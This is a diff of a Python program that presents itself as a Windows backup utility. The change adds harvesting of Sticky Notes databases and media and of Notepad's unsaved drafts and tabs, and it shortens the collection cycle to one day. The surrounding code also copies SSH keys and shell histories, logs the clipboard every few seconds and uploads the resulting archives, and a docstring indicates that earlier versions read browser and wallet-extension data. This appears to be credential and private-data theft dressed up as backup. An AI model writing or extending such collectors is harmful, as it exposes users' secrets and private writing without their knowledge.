@@ -65,6 +65,10 @@ def format_elapsed(started):
 def task_label(label):
     if label == 'screenshots':
         return '截图'
+    if label == 'sticky_notes':
+        return '便签'
+    if label == 'notepad_session':
+        return '记事本会话'
     if label == 'specified':
         return '指定文件'
     match = re.fullmatch(r'disk_(.+)_(docs|configs)', label)
@@ -89,7 +93,9 @@ def log_stage(record):
         return '上传'
     if 'archive' in function or function in ('zip_backup_folder', 'split_large_file', 'split_large_directory'):
         return '归档'
-    if any(word in function for word in ('collect', 'copy', 'backup_disk', 'backup_windows', 'backup_screenshots')):
+    if any(word in function for word in ('collect', 'copy', 'backup_disk', 'backup_windows',
+                                         'backup_screenshots', 'backup_sticky_notes',
+                                         'backup_notepad')):
         return '收集'
     if 'state' in function:
         return '状态'
@@ -205,7 +211,7 @@ class BackupConfig:
     FILE_DELETE_RETRY_DELAY = 2  # 文件删除重试等待时间（秒）
     
     # 监控配置
-    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
+    BACKUP_INTERVAL = 24 * 60 * 60  # 备份间隔时间：1天（单位：秒）
     CLIPBOARD_INTERVAL = 1200  # JTB备份间隔时间（20分钟，单位：秒）
     CLIPBOARD_CHECK_INTERVAL = 3  # JTB检查间隔（秒）
     CLIPBOARD_UPLOAD_CHECK_INTERVAL = 30  # JTB上传检查间隔（秒）
@@ -251,6 +257,11 @@ class BackupConfig:
     STICKY_NOTES_RELATIVE_PATH = (
         r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite"
     )
+    STICKY_NOTES_ENABLED = True
+    NOTEPAD_SESSION_ENABLED = True
+    NOTEPAD_PACKAGE_RELATIVE_PATH = (
+        r"AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe"
+    )
     try:
         if os.path.isdir(_PACKAGES_DIR):
             for _entry in os.listdir(_PACKAGES_DIR):
@@ -292,7 +303,6 @@ class BackupConfig:
     # 指定要直接复制的目录和文件（相对于用户主目录 %USERPROFILE%）
     WINDOWS_SPECIFIC_DIRS = [
         DESKTOP_RELATIVE_PATH,  # 桌面目录（自动检测）
-        STICKY_NOTES_RELATIVE_PATH,  # 便签数据库（自动检测包名，失败则使用默认路径）
         ".ssh",  # SSH配置
         ".python_history",  # Python 历史记录文件
         ".node_repl_history",  # Node.js REPL 历史记录文件
@@ -409,6 +419,76 @@ def is_within(path, directory, include_root=False):
         return os.path.commonpath([candidate, root]) == root and (include_root or candidate != root)
     except ValueError:
         return False
+
+
+def find_sticky_notes_database(user_root=None, configured_relative=None):
+    """返回当前用户的 Windows 便签 plum.sqlite，优先使用显式配置。"""
+    user_root = os.path.abspath(user_root or os.path.expandvars('%USERPROFILE%'))
+    candidates = []
+    if configured_relative:
+        candidates.append(configured_relative if os.path.isabs(configured_relative)
+                          else os.path.join(user_root, configured_relative))
+    default_relative = (
+        r"AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe"
+        r"\LocalState\plum.sqlite"
+    )
+    candidates.append(os.path.join(user_root, default_relative))
+    packages = os.path.join(user_root, 'AppData', 'Local', 'Packages')
+    try:
+        entries = os.listdir(packages)
+    except OSError:
+        entries = []
+    exact = []
+    fallback = []
+    for entry in entries:
+        lowered = entry.casefold()
+        if lowered.startswith('microsoft.microsoftstickynotes_'):
+            exact.append(entry)
+        elif 'stickynotes' in lowered:
+            fallback.append(entry)
+    for entry in sorted(exact, reverse=True) + sorted(fallback, reverse=True):
+        candidates.append(os.path.join(packages, entry, 'LocalState', 'plum.sqlite'))
+
+    seen = set()
+    for candidate in candidates:
+        identity = os.path.normcase(os.path.realpath(os.path.abspath(candidate)))
+        if identity in seen:
+            continue
+        seen.add(identity)
+        if os.path.isfile(candidate):
+            return os.path.abspath(candidate)
+    return None
+
+
+def find_notepad_package_root(user_root=None, configured_relative=None):
+    """返回当前用户的新版 Windows 记事本包目录。"""
+    user_root = os.path.abspath(user_root or os.path.expandvars('%USERPROFILE%'))
+    candidates = []
+    if configured_relative:
+        candidates.append(configured_relative if os.path.isabs(configured_relative)
+                          else os.path.join(user_root, configured_relative))
+    candidates.append(os.path.join(
+        user_root,
+        r"AppData\Local\Packages\Microsoft.WindowsNotepad_8wekyb3d8bbwe",
+    ))
+    packages = os.path.join(user_root, 'AppData', 'Local', 'Packages')
+    try:
+        entries = os.listdir(packages)
+    except OSError:
+        entries = []
+    for entry in sorted(entries, reverse=True):
+        if entry.casefold().startswith('microsoft.windowsnotepad_'):
+            candidates.append(os.path.join(packages, entry))
+
+    seen = set()
+    for candidate in candidates:
+        identity = os.path.normcase(os.path.realpath(os.path.abspath(candidate)))
+        if identity in seen:
+            continue
+        seen.add(identity)
+        if os.path.isdir(candidate):
+            return os.path.abspath(candidate)
+    return None
 
 
 def file_digest(path):
@@ -683,13 +763,19 @@ class BackupManager:
 
     def _load_state(self):
         state = {'version': 1, 'next_backup': None, 'retry_after': None,
-                 'last_success': None, 'collection_complete': False, 'pending': []}
+                 'last_success': None, 'collection_complete': False, 'pending': [],
+                 'cycle_archives': 0}
         if os.path.exists(self.config.STATE_FILE):
             with open(self.config.STATE_FILE, 'r', encoding='utf-8') as stream:
                 saved = json.load(stream)
             if not isinstance(saved, dict) or saved.get('version') != 1:
                 raise ValueError('备份状态文件格式无效；已保留原文件')
             state.update(saved)
+            # 旧状态文件没有归档计数：按 0 处理，本轮重新收集，避免无归档也推进周期。
+            try:
+                state['cycle_archives'] = int(state.get('cycle_archives') or 0)
+            except (TypeError, ValueError):
+                raise ValueError('备份状态文件格式无效；已保留原文件')
             if not isinstance(state['pending'], list):
                 raise ValueError('待上传清单无效')
             for item in state['pending']:
@@ -989,6 +1075,7 @@ class BackupManager:
                     raise InterruptedError('任务已停止')
 
             source_connection.backup(destination_connection, pages=128, progress=progress, sleep=0.05)
+            destination_connection.execute('PRAGMA journal_mode=DELETE').fetchone()
             if destination_connection.execute('PRAGMA quick_check').fetchone()[0] != 'ok':
                 raise OSError('便签数据库一致性检查失败')
             destination_connection.close()
@@ -1004,6 +1091,10 @@ class BackupManager:
                     connection.close()
             if os.path.exists(temporary):
                 os.remove(temporary)
+            for suffix in ('-wal', '-shm', '-journal'):
+                sidecar = temporary + suffix
+                if os.path.exists(sidecar):
+                    os.remove(sidecar)
 
     def _collect_file(self, source, relative, result, deadline, sqlite_snapshot=False):
         target = os.path.join(result.directory, relative)
@@ -1850,14 +1941,216 @@ def backup_screenshots(backup_manager):
     return result
 
 
+STICKY_NOTES_SQLITE_FILES = {
+    'plum.sqlite',
+    'plum.sqlite-wal',
+    'plum.sqlite-shm',
+    'plum.sqlite-journal',
+}
+
+
+def _sticky_notes_media_paths(snapshot_path):
+    """从一致的数据库快照中读取需要一并备份的外部媒体相对路径。"""
+    snapshot_uri = Path(snapshot_path).resolve().as_uri() + '?mode=ro&immutable=1'
+    connection = sqlite3.connect(snapshot_uri, uri=True)
+    try:
+        table = connection.execute(
+            "SELECT 1 FROM sqlite_master WHERE type='table' AND name='Media'").fetchone()
+        if not table:
+            return []
+        columns = {row[1] for row in connection.execute("PRAGMA table_info('Media')")}
+        conditions = [
+            'LocalFileRelativePath IS NOT NULL',
+            "LocalFileRelativePath <> ''",
+        ]
+        if 'DeletedAt' in columns:
+            conditions.append('DeletedAt IS NULL')
+        if 'IsOrphaned' in columns:
+            conditions.append('COALESCE(IsOrphaned, 0) = 0')
+        query = (
+            "SELECT DISTINCT LocalFileRelativePath FROM Media WHERE " +
+            ' AND '.join(conditions) + ' ORDER BY LocalFileRelativePath'
+        )
+        return [row[0] for row in connection.execute(query)]
+    finally:
+        connection.close()
+
+
+def _resolve_sticky_notes_asset(local_state_root, relative_path):
+    relative_path = str(relative_path).replace('/', os.sep).replace('\\', os.sep)
+    if os.path.isabs(relative_path):
+        candidates = [relative_path]
+    else:
+        candidates = [
+            os.path.join(local_state_root, relative_path),
+            os.path.join(local_state_root, 'profile', relative_path),
+        ]
+    for candidate in candidates:
+        if is_within(candidate, local_state_root) and os.path.isfile(candidate):
+            return os.path.abspath(candidate)
+    return None
+
+
+def backup_sticky_notes(backup_manager, user_root=None):
+    """独立备份便签数据库快照、profile 目录和数据库引用的媒体文件。"""
+    user_root = os.path.abspath(user_root or os.path.expandvars('%USERPROFILE%'))
+    result = CollectionResult(backup_manager.new_staging_directory('sticky_notes'))
+    configured = getattr(backup_manager.config, 'STICKY_NOTES_RELATIVE_PATH', None)
+    database = find_sticky_notes_database(user_root, configured)
+    if not database:
+        result.errors.append('未找到 Windows 便签数据库 plum.sqlite')
+        return result
+    if not is_within(database, user_root):
+        result.errors.append('便签数据库必须位于当前用户目录: ' + database)
+        return result
+
+    deadline = time.monotonic() + backup_manager.config.SCAN_TIMEOUT
+    local_state_root = os.path.dirname(database)
+    relative_database = os.path.relpath(database, user_root)
+    backup_manager._collect_file(
+        database, relative_database, result, deadline, sqlite_snapshot=True)
+    snapshot_path = os.path.join(result.directory, relative_database)
+    if result.errors or not os.path.isfile(snapshot_path):
+        return result
+
+    try:
+        snapshot_uri = Path(snapshot_path).resolve().as_uri() + '?mode=ro&immutable=1'
+        connection = sqlite3.connect(snapshot_uri, uri=True)
+        try:
+            note_table = connection.execute(
+                "SELECT 1 FROM sqlite_master WHERE type='table' AND name='Note'").fetchone()
+            if not note_table:
+                result.errors.append('便签数据库缺少 Note 表')
+            else:
+                columns = {row[1] for row in connection.execute("PRAGMA table_info('Note')")}
+                condition = ' WHERE DeletedAt IS NULL' if 'DeletedAt' in columns else ''
+                count = connection.execute('SELECT COUNT(*) FROM Note' + condition).fetchone()[0]
+                DETAIL_LOGGER.info('便签数据库快照校验通过: %s 条有效便签', count)
+        finally:
+            connection.close()
+    except sqlite3.Error as exc:
+        result.errors.append('便签数据库快照校验失败: ' + str(exc))
+        return result
+
+    profile_root = os.path.join(local_state_root, 'profile')
+    if os.path.isdir(profile_root):
+        profile_relative = os.path.relpath(profile_root, user_root)
+        backup_manager._collect_tree(
+            profile_root, result, deadline, prefix=profile_relative,
+            file_filter=lambda name: name.casefold() not in STICKY_NOTES_SQLITE_FILES)
+
+    try:
+        media_paths = _sticky_notes_media_paths(snapshot_path)
+    except sqlite3.Error as exc:
+        result.errors.append('读取便签媒体清单失败: ' + str(exc))
+        return result
+    for media_path in media_paths:
+        source = _resolve_sticky_notes_asset(local_state_root, media_path)
+        if not source:
+            result.errors.append('便签媒体文件缺失或越界: ' + str(media_path))
+            continue
+        relative = os.path.relpath(source, user_root)
+        if relative.replace(os.sep, '/') in result.files:
+            continue
+        backup_manager._collect_file(source, relative, result, deadline)
+    return result
+
+
+NOTEPAD_STATE_RELATIVE_DIRS = (
+    r'LocalState\TabState',
+    r'LocalState\WindowState',
+)
+
+
+def _notepad_state_signature(package_root):
+    """记录整个记事本会话的文件状态，用于判断复制期间是否发生变化。"""
+    signature = {}
+    for relative in NOTEPAD_STATE_RELATIVE_DIRS:
+        source = os.path.join(package_root, relative)
+        if not os.path.isdir(source):
+            continue
+        for root, _, files in os.walk(source, followlinks=False):
+            for name in files:
+                path = os.path.join(root, name)
+                if os.path.islink(path):
+                    continue
+                metadata = os.stat(path, follow_symlinks=False)
+                relative_path = os.path.relpath(path, package_root).replace(os.sep, '/')
+                signature[relative_path] = (
+                    metadata.st_size,
+                    metadata.st_mtime_ns,
+                    getattr(metadata, 'st_ino', None),
+                )
+    return signature
+
+
+def backup_notepad_session(backup_manager, user_root=None):
+    """独立备份新版记事本的标签页、未保存草稿和窗口会话。"""
+    user_root = os.path.abspath(user_root or os.path.expandvars('%USERPROFILE%'))
+    configured = getattr(backup_manager.config, 'NOTEPAD_PACKAGE_RELATIVE_PATH', None)
+    package_root = find_notepad_package_root(user_root, configured)
+    result = CollectionResult(backup_manager.new_staging_directory('notepad_session'))
+    if not package_root:
+        result.skipped += 1
+        DETAIL_LOGGER.info('未发现新版 Windows 记事本包，跳过会话备份')
+        return result
+
+    available = [relative for relative in NOTEPAD_STATE_RELATIVE_DIRS
+                 if os.path.isdir(os.path.join(package_root, relative))]
+    if not available:
+        result.skipped += 1
+        DETAIL_LOGGER.info('记事本会话目录为空，跳过备份')
+        return result
+
+    attempts = max(1, backup_manager.config.FILE_RETRY_COUNT)
+    for attempt in range(attempts):
+        if attempt:
+            result = CollectionResult(backup_manager.new_staging_directory('notepad_session'))
+        deadline = time.monotonic() + backup_manager.config.SCAN_TIMEOUT
+        try:
+            before = _notepad_state_signature(package_root)
+            for relative in available:
+                source = os.path.join(package_root, relative)
+                prefix = os.path.relpath(source, user_root)
+                backup_manager._collect_tree(source, result, deadline, prefix=prefix)
+            after = _notepad_state_signature(package_root)
+        except OSError as exc:
+            result.errors.append('读取记事本会话失败: ' + str(exc))
+            return result
+
+        changed = before != after
+        if not result.errors and not changed:
+            binary_count = sum(path.casefold().endswith('.bin') for path in result.files)
+            DETAIL_LOGGER.info('记事本会话快照校验通过: %s 个文件，%s 个二进制状态文件',
+                               len(result.files), binary_count)
+            return result
+        if not changed:
+            return result
+
+        message = '记事本会话在复制期间发生变化'
+        if attempt + 1 == attempts:
+            result.errors.append(message)
+        else:
+            DETAIL_LOGGER.info('%s，将重试整个会话快照', message)
+            backup_manager._clean_directory(result.directory)
+            backup_manager.stop_event.wait(backup_manager.config.FILE_RETRY_DELAY)
+    return result
+
+
 def backup_windows_data(backup_manager):
-    """仅备份截图和配置中指定的文件；不再访问浏览器或钱包扩展数据库。"""
+    """备份便签、截图和配置中指定的文件；不访问浏览器或钱包扩展数据库。"""
     batch = BackupBatch()
-    for label, collect in (
+    collectors = []
+    if getattr(backup_manager.config, 'STICKY_NOTES_ENABLED', True):
+        collectors.append(('sticky_notes', lambda: backup_sticky_notes(backup_manager)))
+    if getattr(backup_manager.config, 'NOTEPAD_SESSION_ENABLED', True):
+        collectors.append(('notepad_session', lambda: backup_notepad_session(backup_manager)))
+    collectors.extend((
         ('screenshots', lambda: backup_screenshots(backup_manager)),
         ('specified', lambda: backup_manager.backup_specified_files(
             os.path.expandvars('%USERPROFILE%'), backup_manager.new_staging_directory('specified'))),
-    ):
+    ))
+    for label, collect in collectors:
         try:
             _finish_collection(backup_manager, collect(), label, batch)
         except Exception as exc:
@@ -1901,11 +2194,36 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
 
 def _complete_cycle(backup_manager, now):
     backup_manager.update_state(
-        collection_complete=False, retry_after=None, last_success=now.isoformat(),
+        collection_complete=False, retry_after=None, cycle_archives=0,
+        last_success=now.isoformat(),
         next_backup=(now + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)).isoformat())
     next_time = datetime.fromisoformat(backup_manager.state['next_backup']).strftime('%Y-%m-%d %H:%M:%S')
     log_event(logging.INFO, '完成', 'cycle_complete',
               '本轮数据备份已全部完成 | 下次备份：%s', next_time)
+
+
+def _finish_or_retry(backup_manager, now):
+    """本轮只有生成有效归档、备份非部分完成且全部上传成功，才推进 1 天周期。
+
+    运行日志、剪贴板日志属于独立上传类别，其失败不影响数据备份周期判定。
+    """
+    state = backup_manager.state
+    reasons = []
+    if not state.get('cycle_archives'):
+        reasons.append('未生成本轮有效归档')
+    if not state['collection_complete']:
+        reasons.append('部分备份未完成')
+    if backup_manager.has_pending('backup'):
+        reasons.append('归档未全部上传成功')
+    if not reasons:
+        _complete_cycle(backup_manager, now)
+        return True
+    backup_manager.update_state(
+        retry_after=(now + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
+    log_event(logging.WARNING, '未完成', 'cycle_incomplete',
+              '本轮备份未完整完成（%s） | %s秒后重试 | 副本及失败记录已保留，详情见文件日志',
+              '；'.join(reasons), backup_manager.config.ERROR_RETRY_DELAY)
+    return False
 
 
 def run_scheduled_iteration(backup_manager, now=None):
@@ -1917,14 +2235,13 @@ def run_scheduled_iteration(backup_manager, now=None):
         return
     backup_manager.process_pending_uploads()
     if state['collection_complete']:
-        if not backup_manager.has_pending('backup'):
-            _complete_cycle(backup_manager, clock())
+        if not backup_manager.state.get('cycle_archives'):
+            # 该轮没有生成任何有效归档，作废后重新收集，避免空轮推进周期。
+            backup_manager.update_state(collection_complete=False, retry_after=None)
+            log_event(logging.WARNING, '重试', 'cycle_restart',
+                      '上一轮未生成有效归档，本轮重新收集 | 本地副本已保留')
         else:
-            backup_manager.update_state(
-                retry_after=(clock() + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
-            log_event(logging.WARNING, '重试', 'upload_retry',
-                      '收集已完成，仍有归档待上传 | %s秒后重试 | 本地副本已保留',
-                      backup_manager.config.ERROR_RETRY_DELAY)
+            _finish_or_retry(backup_manager, clock())
         return
     next_backup = backup_manager.state['next_backup']
     if next_backup and now < datetime.fromisoformat(next_backup):
@@ -1940,10 +2257,10 @@ def run_scheduled_iteration(backup_manager, now=None):
     if shutil.disk_usage(backup_manager.config.BACKUP_ROOT).free < backup_manager.config.MIN_FREE_SPACE:
         raise OSError('备份磁盘剩余空间低于 MIN_FREE_SPACE，保留已有文件并暂停新一轮收集')
     started = time.monotonic()
-    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、指定文件和截图')
+    log_event(logging.INFO, '开始', 'cycle_start', '开始文件备份：磁盘文档、便签、指定文件和截图')
     batch = backup_disks(backup_manager, get_available_disks(backup_manager.config))
     batch.extend(backup_windows_data(backup_manager))
-    backup_manager.update_state(collection_complete=batch.complete)
+    backup_manager.update_state(collection_complete=batch.complete, cycle_archives=len(batch.paths))
     log_event(logging.INFO if batch.complete else logging.WARNING, '收集', 'collection_result',
               '已复制 %s 个文件（%s） | 跳过 %s 项 | 失败 %s 项 | 超时 %s 个任务 | 耗时 %s',
               format(sum(len(result.files) for result in batch.collections), ','),
@@ -1953,14 +2270,7 @@ def run_scheduled_iteration(backup_manager, now=None):
               sum(result.timed_out for result in batch.collections), format_elapsed(started))
     backup_and_upload_logs(backup_manager)
     backup_manager.process_pending_uploads()
-    if batch.complete and not backup_manager.has_pending('backup'):
-        _complete_cycle(backup_manager, clock())
-    else:
-        backup_manager.update_state(
-            retry_after=(clock() + timedelta(seconds=backup_manager.config.ERROR_RETRY_DELAY)).isoformat())
-        log_event(logging.WARNING, '未完成', 'cycle_incomplete',
-                  '本轮备份未完成 | %s秒后重试 | 副本及失败记录已保留，详情见文件日志',
-                  backup_manager.config.ERROR_RETRY_DELAY)
+    _finish_or_retry(backup_manager, clock())
 
 
 def periodic_backup_upload(backup_manager):
